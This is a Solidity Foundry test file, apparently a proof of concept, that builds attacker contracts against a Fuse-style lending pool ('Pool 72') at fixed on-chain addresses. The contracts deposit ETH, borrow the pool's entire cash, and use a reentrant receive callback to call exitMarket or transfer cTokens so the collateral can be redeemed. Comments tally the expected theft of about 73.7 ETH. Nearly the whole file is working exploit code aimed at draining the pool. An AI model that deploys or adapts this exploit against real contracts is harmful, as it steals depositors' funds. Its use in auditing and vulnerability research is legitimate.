// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IComptroller {
    function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory);
    function exitMarket(address cToken) external returns (uint256);
    function getAccountLiquidity(address account) external view returns (uint256, uint256, uint256);
    function markets(address) external view returns (bool, uint256);
    function oracle() external view returns (address);
    function admin() external view returns (address);
    function _setCollateralFactor(address cToken, uint256 newCollateralFactorMantissa) external returns (uint256);
    function _setPriceOracle(address newOracle) external returns (uint256);
    function getAllMarkets() external view returns (address[] memory);
    function borrowGuardianPaused(address) external view returns (bool);
}

interface ICEther {
    function mint() external payable;
    function borrow(uint256 borrowAmount) external returns (uint256);
    function repayBorrow() external payable;
    function redeem(uint256 redeemTokens) external returns (uint256);
    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);
    function getCash() external view returns (uint256);
    function totalBorrows() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function totalReserves() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function borrowBalanceStored(address) external view returns (uint256);
    function exchangeRateStored() external view returns (uint256);
    function transfer(address dst, uint256 amount) external returns (bool);
    function accrueInterest() external returns (uint256);
    function totalFuseFees() external view returns (uint256);
    function totalAdminFees() external view returns (uint256);
}

contract Pool72Attacker {
    IComptroller constant COMPTROLLER = IComptroller(0xDcc615Ba569e60c7eD31B74686624fC1770bdD9A);
    ICEther constant FETH72 = ICEther(0x8Ea8Fcd938D45D2461e023b96044Acab4780F07b);

    address payable immutable owner;
    bool borrowInFlight;
    bool reentered;
    uint256 public exitCode;

    constructor(address payable _owner) {
        owner = _owner;
    }

    function attack() external payable {
        uint256 cash = FETH72.getCash();
        console.log("Cash in pool:", cash);
        console.log("Deposit:", msg.value);

        // Mint fETH-72
        FETH72.mint{value: msg.value}();
        uint256 cTokens = FETH72.balanceOf(address(this));
        console.log("cTokens minted:", cTokens);

        // Enter market
        address[] memory markets = new address[](1);
        markets[0] = address(FETH72);
        uint256[] memory results = COMPTROLLER.enterMarkets(markets);
        require(results[0] == 0, "enterMarkets failed");

        // Check liquidity
        (uint256 err, uint256 liquidity, uint256 shortfall) = COMPTROLLER.getAccountLiquidity(address(this));
        console.log("Liquidity:", liquidity);
        console.log("Shortfall:", shortfall);

        // Borrow
        uint256 borrowAmt = cash - 1;
        console.log("Borrow amount:", borrowAmt);

        borrowInFlight = true;
        uint256 borrowResult = FETH72.borrow(borrowAmt);
        borrowInFlight = false;

        console.log("Borrow result:", borrowResult);
        console.log("Reentered:", reentered);
        console.log("Exit code:", exitCode);

        if (reentered && exitCode == 0) {
            // Redeem collateral
            uint256 redeemResult = FETH72.redeem(FETH72.balanceOf(address(this)));
            console.log("Redeem result:", redeemResult);
        }

        // Send all ETH to owner
        (bool ok,) = owner.call{value: address(this).balance}("");
        require(ok);
    }

    receive() external payable {
        if (!borrowInFlight || reentered) return;
        reentered = true;

        console.log("=== REENTRANT CALLBACK ===");
        console.log("ETH received:", msg.value);

        // Try exitMarket
        exitCode = COMPTROLLER.exitMarket(address(FETH72));
        console.log("exitMarket result:", exitCode);
    }
}

contract Pool72CTokenTransferAttacker {
    IComptroller constant COMPTROLLER = IComptroller(0xDcc615Ba569e60c7eD31B74686624fC1770bdD9A);
    ICEther constant FETH72 = ICEther(0x8Ea8Fcd938D45D2461e023b96044Acab4780F07b);

    address payable immutable owner;
    bool borrowInFlight;
    bool reentered;

    constructor(address payable _owner) {
        owner = _owner;
    }

    function attack() external payable {
        uint256 cash = FETH72.getCash();
        console.log("Cash in pool:", cash);

        FETH72.mint{value: msg.value}();
        uint256 cTokens = FETH72.balanceOf(address(this));
        console.log("cTokens minted:", cTokens);

        address[] memory markets = new address[](1);
        markets[0] = address(FETH72);
        COMPTROLLER.enterMarkets(markets);

        uint256 borrowAmt = cash - 1;

        borrowInFlight = true;
        uint256 borrowResult = FETH72.borrow(borrowAmt);
        borrowInFlight = false;

        console.log("Borrow result:", borrowResult);
        console.log("Reentered:", reentered);

        (bool ok,) = owner.call{value: address(this).balance}("");
        require(ok);
    }

    receive() external payable {
        if (!borrowInFlight || reentered) return;
        reentered = true;

        console.log("=== REENTRANT CALLBACK (transfer variant) ===");
        console.log("ETH received:", msg.value);

        // Transfer cTokens to owner instead of exitMarket
        uint256 cTokens = FETH72.balanceOf(address(this));
        console.log("cTokens to transfer:", cTokens);
        bool ok = FETH72.transfer(owner, cTokens);
        console.log("Transfer success:", ok);
    }
}

contract Pool72Test is Test {
    IComptroller constant COMPTROLLER = IComptroller(0xDcc615Ba569e60c7eD31B74686624fC1770bdD9A);
    ICEther constant FETH72 = ICEther(0x8Ea8Fcd938D45D2461e023b96044Acab4780F07b);

    address payable attacker;

    function setUp() public {
        attacker = payable(address(0xBEEF));
        vm.deal(attacker, 200 ether);
    }

    function testPool72SelfCollateral() public {
        console.log("=== Pool 72 Self-Collateral Attack ===");

        uint256 cash = FETH72.getCash();
        console.log("Pool cash:", cash);

        uint256 totalBorrows = FETH72.totalBorrows();
        console.log("Total borrows:", totalBorrows);

        uint256 totalReserves = FETH72.totalReserves();
        console.log("Total reserves:", totalReserves);

        uint256 exchangeRate = FETH72.exchangeRateStored();
        console.log("Exchange rate:", exchangeRate);

        (bool listed, uint256 cf) = COMPTROLLER.markets(address(FETH72));
        console.log("Listed:", listed);
        console.log("Collateral factor:", cf);

        // Need collateral = borrowAmount / CF = (73.7 ETH) / 0.5 = 147.4 ETH
        uint256 depositAmount = 150 ether;

        vm.startPrank(attacker);
        Pool72Attacker attackContract = new Pool72Attacker(attacker);
        uint256 balBefore = attacker.balance;
        attackContract.attack{value: depositAmount}();
        uint256 balAfter = attacker.balance;
        console.log("Balance before:", balBefore);
        console.log("Balance after:", balAfter);
        if (balAfter > balBefore) {
            console.log("PROFIT:", balAfter - balBefore);
        } else {
            console.log("LOSS:", balBefore - balAfter);
        }
        vm.stopPrank();
    }

    function testPool72CTokenTransfer() public {
        console.log("=== Pool 72 CToken Transfer Attack ===");

        uint256 cash = FETH72.getCash();
        uint256 depositAmount = 150 ether;

        vm.startPrank(attacker);
        Pool72CTokenTransferAttacker attackContract = new Pool72CTokenTransferAttacker(attacker);
        uint256 balBefore = attacker.balance;
        attackContract.attack{value: depositAmount}();

        // Now try to redeem the transferred cTokens
        uint256 cTokenBal = FETH72.balanceOf(attacker);
        console.log("cTokens received by attacker:", cTokenBal);
        if (cTokenBal > 0) {
            uint256 redeemResult = FETH72.redeem(cTokenBal);
            console.log("Redeem result:", redeemResult);
        }

        uint256 balAfter = attacker.balance;
        console.log("Balance before:", balBefore);
        console.log("Balance after:", balAfter);
        if (balAfter > balBefore) {
            console.log("PROFIT:", balAfter - balBefore);
        } else {
            console.log("LOSS:", balBefore - balAfter);
        }
        vm.stopPrank();
    }

    function testPool72SimpleBorrow() public {
        // Simple approach: deposit a lot of ETH, borrow the pool's cash, never repay
        // Net effect: we lose deposit but gain pool cash. Only works if CF > 0.
        console.log("=== Pool 72 Simple Borrow (no reentrancy) ===");

        uint256 cash = FETH72.getCash();
        console.log("Pool cash:", cash);

        (bool listed, uint256 cf) = COMPTROLLER.markets(address(FETH72));
        console.log("CF:", cf);

        // With CF=50%, to borrow X we need 2X collateral
        // Pool has ~73.7 ETH cash.
        // We deposit 150 ETH, borrow 73.7 ETH → net: we put in 150, get 73.7 = loss of 76.3
        // BUT our collateral (150 ETH as fETH) is still there - we can redeem after repay
        // The trick: borrow, then default. But we can't redeem our collateral without repaying.
        // With reentrancy: borrow, exit during callback, redeem collateral
        // Net: deposit 150, get 73.7 (borrow) + 150 (redeem) = profit 73.7 ETH

        // Let's just check: what if we deposit then borrow max?
        vm.startPrank(attacker);
        uint256 depositAmount = 150 ether;

        FETH72.mint{value: depositAmount}();
        address[] memory markets = new address[](1);
        markets[0] = address(FETH72);
        COMPTROLLER.enterMarkets(markets);

        (uint256 err, uint256 liquidity, uint256 shortfall) = COMPTROLLER.getAccountLiquidity(attacker);
        console.log("Err:", err);
        console.log("Liquidity:", liquidity);
        console.log("Shortfall:", shortfall);

        // Max borrow = liquidity (in ETH terms since ETH price = 1e18)
        uint256 maxBorrow = liquidity;
        console.log("Max borrow:", maxBorrow);
        console.log("Pool cash:", cash);

        uint256 borrowAmt = cash > maxBorrow ? maxBorrow : cash - 1;
        console.log("Borrow amount:", borrowAmt);

        uint256 borrowResult = FETH72.borrow(borrowAmt);
        console.log("Borrow result:", borrowResult);

        // Check post-borrow state
        console.log("Borrow balance:", FETH72.borrowBalanceStored(attacker));
        (err, liquidity, shortfall) = COMPTROLLER.getAccountLiquidity(attacker);
        console.log("Post-borrow liquidity:", liquidity);
        console.log("Post-borrow shortfall:", shortfall);

        vm.stopPrank();
    }
}
